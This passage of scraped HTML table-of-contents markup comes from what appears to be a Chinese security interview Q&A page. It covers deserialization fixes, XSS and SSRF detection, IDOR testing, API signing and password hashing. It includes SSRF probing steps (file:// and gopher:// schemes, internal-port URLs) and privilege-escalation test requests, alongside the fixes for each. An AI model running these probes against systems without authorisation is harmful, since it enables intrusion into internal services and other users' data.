class="toc-number">29.1.</span> <span class="toc-text">Java Web 应用中的反序列化漏洞的 Source 和 Sink 是什么？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E7%A6%81%E7%94%A8%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84-readObject-%EF%BC%9A-%E4%BB%85%E5%85%81%E8%AE%B8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%AF%E4%BF%A1%E7%B1%BB%E5%9E%8B%EF%BC%9A"><span class="toc-number">30.</span> <span class="toc-text">修复方案：- 禁用不安全的 readObject()：  123protected Object readObject(ObjectInputStream in) throws InvalidObjectException {    throw new InvalidObjectException(&quot;Deserialization not allowed&quot;);}- 仅允许反序列化可信类型：  1234ObjectInputFilter filter &#x3D; info -&gt;     info.serialClass() !&#x3D; null &amp;&amp; allowedClasses.contains(info.serialClass());ObjectInputStream ois &#x3D; new ObjectInputStream(in);ois.setObjectInputFilter(filter);</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%91%E7%9B%92%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8B-XSS-%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="toc-number">30.1.</span> <span class="toc-text">黑盒如何检测 XSS 漏洞？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E4%BD%BF%E7%94%A8-Content-Security-Policy-%E9%99%90%E5%88%B6-JavaScript-%E6%89%A7%E8%A1%8C%E6%9D%A5%E6%BA%90%E3%80%82-%E9%87%87%E7%94%A8-encodeURIComponent-%E5%AF%B9%E8%BE%93%E5%85%A5%E6%95%B0%E6%8D%AE%E8%BF%9B%E8%A1%8C%E8%BD%AC%E4%B9%89%E3%80%82"><span class="toc-number">31.</span> <span class="toc-text">修复方案：- 使用 Content-Security-Policy 限制 JavaScript 执行来源。- 采用 encodeURIComponent() 对输入数据进行转义。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%B2%E6%96%B9%E9%BB%91%E7%9B%92%E6%98%AF%E5%90%A6%E5%BA%94%E5%85%B7%E5%A4%87%E7%88%AC%E5%8F%96%E6%B5%81%E9%87%8F%E5%8A%9F%E8%83%BD%EF%BC%9F"><span class="toc-number">31.0.1.</span> <span class="toc-text">甲方黑盒是否应具备爬取流量功能？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%98%E4%B8%AD%E6%96%B9%E6%A1%88%EF%BC%9A-%E5%85%81%E8%AE%B8%E5%9F%BA%E4%BA%8E%E6%8E%88%E6%9D%83%E7%9A%84%E7%88%AC%E5%8F%96%EF%BC%8C%E5%B9%B6%E6%8F%90%E4%BE%9B%E6%B5%81%E9%87%8F%E7%99%BD%E5%90%8D%E5%8D%95%E6%9C%BA%E5%88%B6%E3%80%82-%E7%BB%93%E5%90%88-Web-%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E8%BF%9B%E8%A1%8C%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F%E3%80%82"><span class="toc-number">32.</span> <span class="toc-text">折中方案：- 允许基于授权的爬取，并提供流量白名单机制。- 结合 Web 日志和流量分析进行被动扫描。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E7%9B%92%E5%A6%82%E4%BD%95%E6%89%AB%E6%8F%8F%E6%97%A0%E6%B3%95%E5%87%BA%E7%BD%91%E7%9A%84-SSRF%EF%BC%9F"><span class="toc-number">32.0.1.</span> <span class="toc-text">黑盒如何扫描无法出网的 SSRF？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%EF%BC%9A1-%E6%9C%AC%E5%9C%B0%E6%8E%A2%E6%B5%8B%EF%BC%9A-%E9%80%9A%E8%BF%87-file-%E3%80%81gopher-%E8%AE%BF%E9%97%AE%E6%9C%AC%E5%9C%B0%E8%B5%84%E6%BA%90%EF%BC%8C%E6%B5%8B%E8%AF%95%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%98%AF%E5%90%A6%E6%94%AF%E6%8C%81%E9%9D%9E-HTTP-%E8%AF%B7%E6%B1%82%E3%80%82-%E4%BD%BF%E7%94%A8-http-127-0-0-1-8000-admin-%E6%B5%8B%E8%AF%95%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE%E3%80%822-DNSLog%EF%BC%9A-%E5%9C%A8%E5%86%85%E7%BD%91%E9%83%A8%E7%BD%B2-DNS-%E7%9B%91%E5%90%AC%E6%9C%8D%E5%8A%A1%EF%BC%8C%E6%A3%80%E6%B5%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%98%AF%E5%90%A6%E5%B0%9D%E8%AF%95%E8%A7%A3%E6%9E%90%E5%9F%9F%E5%90%8D%EF%BC%9A-3-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%EF%BC%9A-%E9%80%9A%E8%BF%87-http-127-0-0-1-22%E3%80%81http-localhost-3306-%E5%8F%91%E7%8E%B0%E5%86%85%E9%83%A8%E6%9C%8D%E5%8A%A1%E3%80%82-%E7%BB%93%E5%90%88-burp-collaborator-%E8%BF%9B%E8%A1%8C-OOB-%E6%B5%8B%E8%AF%95%E3%80%82%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E9%99%90%E5%88%B6%E5%A4%96%E9%83%A8%E8%AF%B7%E6%B1%82%E7%9A%84%E7%9B%AE%E6%A0%87-IP%EF%BC%8C%E4%BB%85%E5%85%81%E8%AE%B8%E5%8F%AF%E4%BF%A1%E5%9F%9F%E5%90%8D%E8%AE%BF%E9%97%AE%E3%80%82-%E5%85%B3%E9%97%AD-gopher-%E3%80%81file-%E7%AD%89%E4%B8%8D%E5%BF%85%E8%A6%81%E7%9A%84%E5%8D%8F%E8%AE%AE%E6%94%AF%E6%8C%81%E3%80%82"><span class="toc-number">33.</span> <span class="toc-text">方法：1. 本地探测：   - 通过 file:&#x2F;&#x2F;、gopher:&#x2F;&#x2F; 访问本地资源，测试服务器是否支持非 HTTP 请求。   - 使用 http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;admin 测试内网访问。2. DNSLog：   - 在内网部署 DNS 监听服务，检测服务器是否尝试解析域名：     1dig @127.0.0.1 example.com3. 端口扫描：   - 通过 http:&#x2F;&#x2F;127.0.0.1:22、http:&#x2F;&#x2F;localhost:3306 发现内部服务。   - 结合 burp-collaborator 进行 OOB 测试。修复方案：- 限制外部请求的目标 IP，仅允许可信域名访问。- 关闭 gopher:&#x2F;&#x2F;、file:&#x2F;&#x2F; 等不必要的协议支持。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E7%9B%92%E5%A6%82%E4%BD%95%E6%89%AB%E6%8F%8F%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="toc-number">33.0.1.</span> <span class="toc-text">黑盒如何扫描越权漏洞？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%EF%BC%9A1-%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83%E6%B5%8B%E8%AF%95%EF%BC%9A-%E7%94%A8%E6%88%B7-A-%E8%AE%BF%E9%97%AE%E7%94%A8%E6%88%B7-B-%E6%95%B0%E6%8D%AE%EF%BC%9A-%E6%9B%BF%E6%8D%A2-UID-%E8%A7%82%E5%AF%9F%E8%BF%94%E5%9B%9E%E6%95%B0%E6%8D%AE%E6%98%AF%E5%90%A6%E5%8F%AF%E8%AE%BF%E9%97%AE%E3%80%822-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E6%B5%8B%E8%AF%95%EF%BC%9A-%E4%BD%8E%E6%9D%83%E9%99%90%E7%94%A8%E6%88%B7%E5%B0%9D%E8%AF%95%E8%AE%BF%E9%97%AE%E7%AE%A1%E7%90%86%E5%91%98%E6%8E%A5%E5%8F%A3%EF%BC%9A-%E6%A3%80%E6%9F%A5%E6%98%AF%E5%90%A6%E8%BF%94%E5%9B%9E-403%EF%BC%8C%E6%88%96%E5%B0%9D%E8%AF%95%E4%B8%8D%E5%90%8C%E8%A7%92%E8%89%B2%E8%AE%BF%E9%97%AE%E3%80%823-Token-%E6%9B%BF%E6%8D%A2%EF%BC%9A-%E4%BD%BF%E7%94%A8%E5%B7%B2%E7%99%BB%E5%BD%95%E7%94%A8%E6%88%B7%E7%9A%84-JWT%E3%80%81Cookie%EF%BC%8C%E5%88%87%E6%8D%A2%E8%BA%AB%E4%BB%BD%EF%BC%8C%E8%A7%82%E5%AF%9F%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6%E6%83%85%E5%86%B5%E3%80%82%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E9%87%87%E7%94%A8-RBAC%EF%BC%88%E5%9F%BA%E4%BA%8E%E8%A7%92%E8%89%B2%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%EF%BC%89%EF%BC%8C%E9%81%BF%E5%85%8D-IDOR%EF%BC%88%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E7%9B%B4%E6%8E%A5%E5%AF%B9%E8%B1%A1%E5%BC%95%E7%94%A8%EF%BC%89%E3%80%82-%E5%9C%A8%E5%90%8E%E7%AB%AF%E6%A0%A1%E9%AA%8C%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%EF%BC%8C%E8%80%8C%E9%9D%9E%E4%BB%85%E4%BE%9D%E8%B5%96%E5%89%8D%E7%AB%AF%E9%80%BB%E8%BE%91%E3%80%82"><span class="toc-number">34.</span> <span class="toc-text">方法：1. 水平越权测试：   - 用户 A 访问用户 B 数据：     1GET &#x2F;user&#x2F;profile?uid&#x3D;10086     - 替换 UID 观察返回数据是否可访问。2. 垂直越权测试：   - 低权限用户尝试访问管理员接口：     1GET &#x2F;admin&#x2F;dashboard     - 检查是否返回 403，或尝试不同角色访问。3. Token 替换：   - 使用已登录用户的 JWT、Cookie，切换身份，观察权限控制情况。修复方案：- 采用 RBAC（基于角色的访问控制），避免 IDOR（不安全的直接对象引用）。- 在后端校验用户权限，而非仅依赖前端逻辑。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E7%9B%92%E5%B8%A6%E7%99%BB%E5%BD%95%E6%80%81%E6%89%AB%E6%8F%8F%E5%A6%82%E4%BD%95%E8%A7%84%E9%81%BF%E4%B8%9A%E5%8A%A1%E5%BD%B1%E5%93%8D%EF%BC%9F"><span class="toc-number">34.0.1.</span> <span class="toc-text">黑盒带登录态扫描如何规避业务影响？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E4%BD%BF%E7%94%A8-WAF-%E8%A7%84%E5%88%99-%E9%99%90%E5%88%B6%E9%AB%98%E9%A2%91%E5%BC%82%E5%B8%B8%E8%AF%B7%E6%B1%82%E3%80%82-%E9%87%87%E7%94%A8-%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%EF%BC%8C%E9%81%BF%E5%85%8D%E5%9C%A8%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E7%9B%B4%E6%8E%A5%E6%89%AB%E6%8F%8F%E3%80%82"><span class="toc-number">35.</span> <span class="toc-text">修复方案：- 使用 WAF 规则 限制高频异常请求。- 采用 测试环境，避免在生产环境直接扫描。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E7%9B%92%E6%89%AB%E6%8F%8F%E6%97%B6%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%E8%A2%AB%E5%8F%8D%E5%88%B6%EF%BC%9F"><span class="toc-number">35.0.1.</span> <span class="toc-text">黑盒扫描时如何避免被反制？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%95%BF%E6%9C%9F%E7%AD%96%E7%95%A5%EF%BC%9A-%E9%87%87%E7%94%A8-%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B5%84%E4%BA%A7%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%EF%BC%88%E5%A6%82-Burp-Suite-Headless-Chrome%EF%BC%89%EF%BC%8C%E7%BB%95%E8%BF%87%E7%AE%80%E5%8D%95%E7%9A%84-WAF-%E9%98%B2%E6%8A%A4%E3%80%82"><span class="toc-number">36.</span> <span class="toc-text">长期策略：- 采用 企业级资产扫描工具（如 Burp Suite + Headless Chrome），绕过简单的 WAF 防护。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%81%B0%E7%9B%92%E7%9B%B8%E8%BE%83%E4%BA%8E%E9%BB%91%E7%99%BD%E7%9B%92%E7%9A%84%E4%BC%98%E5%8A%BF%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">36.0.1.</span> <span class="toc-text">灰盒相较于黑白盒的优势是什么？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%81%B0%E7%9B%92%E6%B5%8B%E8%AF%95%E7%9A%84%E4%BC%98%E5%8A%BF%EF%BC%9A-%E7%BB%93%E5%90%88%E9%BB%91%E7%9B%92%E4%B8%8E%E7%99%BD%E7%9B%92%E6%B5%8B%E8%AF%95%EF%BC%9A-%E6%97%A2%E8%83%BD%E5%88%A9%E7%94%A8%E5%86%85%E9%83%A8%E4%BF%A1%E6%81%AF%EF%BC%88%E5%A6%82-API-%E6%96%87%E6%A1%A3%E3%80%81%E9%83%A8%E5%88%86%E4%BB%A3%E7%A0%81%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%EF%BC%89%E6%8F%90%E9%AB%98%E6%B5%8B%E8%AF%95%E6%95%88%E7%8E%87%EF%BC%8C%E5%8F%88%E8%83%BD%E6%A8%A1%E6%8B%9F%E7%9C%9F%E5%AE%9E%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF%E8%BF%9B%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%82-%E6%8F%90%E9%AB%98%E6%B5%8B%E8%AF%95%E8%A6%86%E7%9B%96%E7%8E%87%EF%BC%9A-%E9%80%9A%E8%BF%87%E9%83%A8%E5%88%86%E6%BA%90%E4%BB%A3%E7%A0%81%E5%92%8C%E6%8E%A5%E5%8F%A3%E6%9D%83%E9%99%90%EF%BC%8C%E6%B5%8B%E8%AF%95%E4%BA%BA%E5%91%98%E5%8F%AF%E4%BB%A5%E6%9B%B4%E7%B2%BE%E7%A1%AE%E5%9C%B0%E5%88%86%E6%9E%90%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%A6%82%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E3%80%81%E4%B8%9A%E5%8A%A1%E6%BB%A5%E7%94%A8%E3%80%82-%E5%87%8F%E5%B0%91%E8%AF%AF%E6%8A%A5%EF%BC%9A-%E7%94%B1%E4%BA%8E%E5%8F%AF%E8%AE%BF%E9%97%AE%E9%83%A8%E5%88%86%E5%86%85%E9%83%A8%E9%80%BB%E8%BE%91%EF%BC%8C%E5%87%8F%E5%B0%91%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E8%AF%AF%E6%8A%A5%EF%BC%8C%E6%8F%90%E9%AB%98%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E7%9A%84%E5%87%86%E7%A1%AE%E6%80%A7%E3%80%82"><span class="toc-number">37.</span> <span class="toc-text">灰盒测试的优势：- 结合黑盒与白盒测试：  - 既能利用内部信息（如 API 文档、部分代码访问权限）提高测试效率，又能模拟真实攻击场景进行漏洞挖掘。- 提高测试覆盖率：  - 通过部分源代码和接口权限，测试人员可以更精确地分析逻辑漏洞，如权限绕过、业务滥用。- 减少误报：  - 由于可访问部分内部逻辑，减少黑盒测试中的误报，提高漏洞发现的准确性。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%BD%E8%B1%A1%E6%9D%A5%E7%9C%8B%EF%BC%8C%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E5%88%B0%E5%BA%95%E8%A6%81%E8%AF%84%E4%BB%80%E4%B9%88%E4%B8%9C%E8%A5%BF%EF%BC%9F"><span class="toc-number">37.0.1.</span> <span class="toc-text">抽象来看，安全评估到底要评什么东西？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0%E6%A0%B8%E5%BF%83%EF%BC%9A1-%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%EF%BC%9A-%E8%AF%86%E5%88%AB%E5%8F%AF%E8%83%BD%E7%9A%84%E6%94%BB%E5%87%BB%E5%85%A5%E5%8F%A3%EF%BC%8C%E5%8C%85%E6%8B%AC-API%E3%80%81Web-%E7%95%8C%E9%9D%A2%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E3%80%81%E7%AC%AC%E4%B8%89%E6%96%B9%E9%9B%86%E6%88%90%E7%AD%89%E3%80%822-%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%EF%BC%9A-%E8%AF%84%E4%BC%B0%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E3%80%81%E4%BC%A0%E8%BE%93%E5%8F%8A%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%EF%BC%8C%E9%98%B2%E6%AD%A2%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E5%92%8C%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E3%80%823-%E8%BA%AB%E4%BB%BD%E4%B8%8E%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%EF%BC%9A-%E6%A3%80%E6%9F%A5%E8%AE%A4%E8%AF%81%E6%96%B9%E5%BC%8F%EF%BC%88JWT%E3%80%81OAuth%EF%BC%89%E3%80%81%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6%E6%9C%BA%E5%88%B6%EF%BC%88RBAC%E3%80%81ABAC%EF%BC%89%E3%80%824-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E4%B8%8E%E6%B5%8B%E8%AF%95%EF%BC%9A-%E8%BF%9B%E8%A1%8C%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88SAST%EF%BC%89%E3%80%81%E5%8A%A8%E6%80%81%E6%B5%8B%E8%AF%95%EF%BC%88DAST%EF%BC%89%E3%80%81%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%EF%BC%88Fuzzing%EF%BC%89%E3%80%825-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E9%A3%8E%E9%99%A9%EF%BC%9A-%E8%AF%86%E5%88%AB%E5%A6%82%E6%94%AF%E4%BB%98%E7%BB%95%E8%BF%87%E3%80%81%E7%A7%AF%E5%88%86%E6%BB%A5%E7%94%A8%E3%80%81%E8%AE%A2%E5%8D%95%E5%8A%AB%E6%8C%81%E7%AD%89%E4%B8%9A%E5%8A%A1%E6%BC%8F%E6%B4%9E%E3%80%82"><span class="toc-number">38.</span> <span class="toc-text">安全评估核心：1. 攻击面分析：   - 识别可能的攻击入口，包括 API、Web 界面、数据库、第三方集成等。2. 数据安全：   - 评估数据存储、传输及访问控制的安全性，防止数据泄露和未授权访问。3. 身份与权限管理：   - 检查认证方式（JWT、OAuth）、权限控制机制（RBAC、ABAC）。4. 漏洞扫描与测试：   - 进行静态代码分析（SAST）、动态测试（DAST）、模糊测试（Fuzzing）。5. 业务逻辑风险：   - 识别如支付绕过、积分滥用、订单劫持等业务漏洞。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E5%BA%94%E7%94%A8%E5%BC%80%E6%94%BE%E5%87%BA%E5%8E%BB-API%EF%BC%8C%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E5%93%AA%E4%BA%9B%E9%A3%8E%E9%99%A9%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E5%BA%94%E5%AF%B9%EF%BC%9F"><span class="toc-number">38.0.1.</span> <span class="toc-text">一个应用开放出去 API，可能存在哪些风险以及如何应对？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E5%AF%B9%E6%8E%AA%E6%96%BD%EF%BC%9A-%E5%8A%A0%E5%AF%86%E4%BC%A0%E8%BE%93%EF%BC%9A%E5%BC%BA%E5%88%B6%E4%BD%BF%E7%94%A8-HTTPS%EF%BC%8C%E5%B9%B6%E5%90%AF%E7%94%A8-HSTS-%E4%BF%9D%E6%8A%A4%E3%80%82-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%EF%BC%9A%E4%BD%BF%E7%94%A8-OAuth2-0%E3%80%81JWT-%E6%88%96-API-Key-%E7%BB%93%E5%90%88-HMAC-%E7%AD%BE%E5%90%8D%E3%80%82-%E8%AF%B7%E6%B1%82%E9%98%B2%E6%8A%A4%EF%BC%9A-%E4%BD%BF%E7%94%A8-%E8%AF%B7%E6%B1%82%E7%AD%BE%E5%90%8D%E6%9C%BA%E5%88%B6%EF%BC%8C%E9%98%B2%E6%AD%A2%E7%AF%A1%E6%94%B9%E5%92%8C%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%E3%80%82-%E6%B7%BB%E5%8A%A0-%E6%97%B6%E9%97%B4%E6%88%B3-%E9%9A%8F%E6%9C%BA%E6%95%B0%EF%BC%8C%E7%A1%AE%E4%BF%9D%E8%AF%B7%E6%B1%82%E5%94%AF%E4%B8%80%E6%80%A7%E3%80%82"><span class="toc-number">39.</span> <span class="toc-text">应对措施：- 加密传输：强制使用 HTTPS，并启用 HSTS 保护。- 身份认证：使用 OAuth2.0、JWT 或 API Key 结合 HMAC 签名。- 请求防护：  - 使用 请求签名机制，防止篡改和重放攻击。  - 添加 时间戳 + 随机数，确保请求唯一性。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BE%E8%AE%A1-API-%E7%AD%BE%E5%90%8D%E6%97%B6%EF%BC%8C%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%BD%BF%E7%94%A8%E7%A7%92%E6%97%B6%E9%97%B4%E6%88%B3%EF%BC%88timestamp-s%EF%BC%89%E4%BC%9A%E5%AD%98%E5%9C%A8%E5%93%AA%E4%BA%9B%E9%A3%8E%E9%99%A9%EF%BC%9F"><span class="toc-number">39.0.1.</span> <span class="toc-text">设计 API 签名时，随机数使用秒时间戳（timestamp&#x2F;s）会存在哪些风险？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E5%AF%B9%E6%96%B9%E6%A1%88%EF%BC%9A-%E4%BD%BF%E7%94%A8%E6%AF%AB%E7%A7%92%E7%BA%A7%E6%97%B6%E9%97%B4%E6%88%B3%EF%BC%88timestamp-ms%EF%BC%89%E9%99%8D%E4%BD%8E%E9%87%8D%E6%94%BE%E7%AA%97%E5%8F%A3%E3%80%82-%E5%BC%95%E5%85%A5%E9%9A%8F%E6%9C%BA%E6%95%B0%EF%BC%88nonce%EF%BC%89%EF%BC%8C%E7%A1%AE%E4%BF%9D%E6%AF%8F%E6%AC%A1%E8%AF%B7%E6%B1%82%E7%9A%84%E5%94%AF%E4%B8%80%E6%80%A7%EF%BC%9A"><span class="toc-number">40.</span> <span class="toc-text">应对方案：- 使用毫秒级时间戳（timestamp&#x2F;ms）降低重放窗口。- 引入随机数（nonce），确保每次请求的唯一性：  123timestamp &#x3D; str(int(time.time() * 1000))nonce &#x3D; uuid.uuid4().hexsignature &#x3D; hmac_sha256(secret_key, timestamp + nonce + payload)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BE%E8%AE%A1-API-%E7%AD%BE%E5%90%8D%E6%97%B6%EF%BC%8CHMAC-SHA256-%E5%92%8C-SHA256-%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">40.0.1.</span> <span class="toc-text">设计 API 签名时，HMAC SHA256 和 SHA256 区别是什么？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HMAC-SHA256%EF%BC%9A-%E5%9F%BA%E4%BA%8E-SHA256-%E7%9A%84%E5%8A%A0%E5%AF%86%E5%93%88%E5%B8%8C%E6%B6%88%E6%81%AF%E8%AE%A4%E8%AF%81%E7%A0%81%EF%BC%88Hash-based-Message-Authentication-Code%EF%BC%89%E3%80%82-%E4%BD%BF%E7%94%A8%E5%AF%86%E9%92%A5%E8%BF%9B%E8%A1%8C%E5%93%88%E5%B8%8C%E8%AE%A1%E7%AE%97%EF%BC%9A-%E5%AE%89%E5%85%A8%E6%80%A7%E6%9B%B4%E9%AB%98%EF%BC%9AHMAC-%E9%80%9A%E8%BF%87%E5%AF%86%E9%92%A5%E5%A2%9E%E5%BC%BA%E5%AE%89%E5%85%A8%E6%80%A7%EF%BC%8C%E9%81%BF%E5%85%8D-SHA256-%E5%8F%AF%E8%83%BD%E8%A2%AB%E4%BC%AA%E9%80%A0%E3%80%82"><span class="toc-number">41.</span> <span class="toc-text">HMAC SHA256：- 基于 SHA256 的加密哈希消息认证码（Hash-based Message Authentication Code）。- 使用密钥进行哈希计算：  12345import hmacimport hashlibmessage &#x3D; &quot;data-to-sign&quot;secret_key &#x3D; &quot;my-secret-key&quot;signature &#x3D; hmac.new(secret_key.encode(), message.encode(), hashlib.sha256).hexdigest()- 安全性更高：HMAC 通过密钥增强安全性，避免 SHA256 可能被伪造。</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%A6%82%E4%BD%95%E5%8A%A0%E5%AF%86%E4%BF%9D%E5%AD%98%EF%BC%9F"><span class="toc-number">41.0.1.</span> <span class="toc-text">密码如何加密保存？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%AD%98%E5%82%A8%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5%EF%BC%9A1-%E4%BD%BF%E7%94%A8%E5%BC%BA%E5%93%88%E5%B8%8C%E7%AE%97%E6%B3%95%EF%BC%9A-%E6%8E%A8%E8%8D%90%E4%BD%BF%E7%94%A8-PBKDF2%E3%80%81bcrypt-%E6%88%96-scrypt%EF%BC%8C%E9%81%BF%E5%85%8D%E4%BD%BF%E7%94%A8-MD5%E3%80%81SHA1%E3%80%81SHA256-%E7%9B%B4%E6%8E%A5%E5%AD%98%E5%82%A8%E3%80%822-%E6%B7%BB%E5%8A%A0%E9%9A%8F%E6%9C%BA%E7%9B%90%EF%BC%88Salt%EF%BC%89%EF%BC%9A-%E8%A7%A3%E5%86%B3-%E5%BD%A9%E8%99%B9%E8%A1%A8%E6%94%BB%E5%87%BB%EF%BC%8C%E7%A1%AE%E4%BF%9D%E7%9B%B8%E5%90%8C%E5%AF%86%E7%A0%81%E5%93%88%E5%B8%8C%E5%80%BC%E4%B8%8D%E5%90%8C%E3%80%823-%E4%BD%BF%E7%94%A8%E5%AF%86%E9%92%A5%E6%8E%A8%E5%AF%BC%E5%87%BD%E6%95%B0%EF%BC%9A-PBKDF2%EF%BC%88%E5%9F%BA%E4%BA%8E-HMAC-%E7%9A%84%E5%AF%86%E9%92%A5%E6%B4%BE%E7%94%9F%EF%BC%89%EF%BC%9A-bcrypt%EF%BC%88%E9%80%82%E7%94%A8%E4%BA%8E-Web-%E5%BA%94%E7%94%A8%EF%BC%89%EF%BC%9A-scrypt%EF%BC%88%E9%80%82%E7%94%A8%E4%BA%8E%E9%AB%98%E5%AE%89%E5%85%A8%E5%9C%BA%E6%99%AF%EF%BC%89%EF%BC%9A-4-%E9%81%BF%E5%85%8D%E6%98%8E%E6%96%87%E5%AD%98%E5%82%A8%EF%BC%9A-%E4%B8%A5%E7%A6%81%E5%AD%98%E5%82%A8%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%EF%BC%8C%E6%89%80%E6%9C%89%E5%AF%86%E7%A0%81%E5%BF%85%E9%A1%BB%E7%BB%8F%E8%BF%87%E5%AE%89%E5%85%A8%E5%93%88%E5%B8%8C%E5%A4%84%E7%90%86%E3%80%82"><span class="toc-number">42.</span> <span class="toc-text">密码存储最佳实践：1. 使用强哈希算法：   - 推荐使用 PBKDF2、bcrypt 或 scrypt，避免使用 MD5、SHA1、SHA256 直接存储。2. 添加随机盐（Salt）：   - 解决 彩虹表攻击，确保相同密码哈希值不同。3. 使用密钥推导函数：   - PBKDF2（基于 HMAC 的密钥派生）：     123import hashlib, ossalt &#x3D; os.urandom(16)password_hash &#x3D; hashlib.pbkdf2_hmac(&#39;sha256&#39;, password.encode(), salt, 100000)   - bcrypt（适用于 Web 应用）：     12from bcrypt import gensalt, hashpwhashed &#x3D; hashpw(password.encode(), 